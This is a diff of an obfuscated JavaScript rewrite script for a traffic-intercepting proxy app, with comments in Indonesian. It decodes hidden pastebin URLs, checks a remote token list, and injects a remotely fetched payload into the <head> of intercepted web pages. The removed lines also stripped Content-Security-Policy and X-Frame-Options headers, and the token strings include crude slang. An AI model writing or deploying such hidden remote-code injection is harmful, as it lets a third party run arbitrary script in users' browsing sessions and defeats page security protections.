@@ -1,36 +1,28 @@
-const MY_TOKEN = "ojeng_gacor"; 
+const MY_TOKEN = "malik_pepek"; 
 
+// Link dipotong (Tetap Aman)
 const _0xU1 = "aHR0cHM6"+"Ly9wYXN0ZWJpbi"+"5jb20vcmF3L0d"+"NMVIyZjh1";
 const _0xU2 = "aHR0cHM6"+"Ly9wYXN0ZWJp"+"bi5jb20vcmF3L"+"2tSWFY3ZnNU";
 
-const _0xF = ['includes', 'body', 'headers', 'replace', '<head>', 'Content-Security-Policy', 'X-Frame-Options', 'post'];
-const _0xM = (n) => _0xF[n];
+// Request Token & Payload secara bersamaan (Parallel)
+const req1 = { url: atob(_0xU1) + "?t=" + Date.now() };
+const req2 = { url: atob(_0xU2) };
 
-const _0xR1 = { url: atob(_0xU1) + "?t=" + Date.now() };
-const _0xR2 = { url: atob(_0xU2) };
+Promise.all([$task.fetch(req1), $task.fetch(req2)]).then(results => {
+    const tokenData = results[0].body;
+    const uiData = results[1].body;
 
-$task.fetch(_0xR1).then(response => {
-    if (response.body && response.body[_0xM(0)](MY_TOKEN)) {
-        $task.fetch(_0xR2).then(resp2 => {
-            let b = $response[_0xM(1)];
-            let h = $response[_0xM(2)];
-            let p = resp2.body;
-
-            if (h) {
-                delete h[_0xM(5)];
-                delete h[_0xM(6)];
-            }
-
-            if (b && p) {
-                const tag = _0xM(4);
-                b = b[_0xM(3)](tag, tag + p);
-            }
-            $done({ body: b, headers: h });
-        }, () => $done({}));
+    if (tokenData && tokenData.includes(MY_TOKEN) && uiData) {
+        let b = $response.body;
+        if (b) {
+            // Langsung inject tanpa modifikasi header berat
+            b = b.replace("<head>", "<head>" + uiData);
+        }
+        $done({ body: b });
     } else {
-        if (response.body) {
-            $notify("SYSTEM SECURITY", "ACCESS DENIED", "Token " + MY_TOKEN + " is not active.");
+        if (tokenData && !tokenData.includes(MY_TOKEN)) {
+            $notify("SECURITY", "OFFLINE", "Token Invalid");
         }
         $done({});
     }
-}, () => $done({}));
+}).catch(() => $done({}));
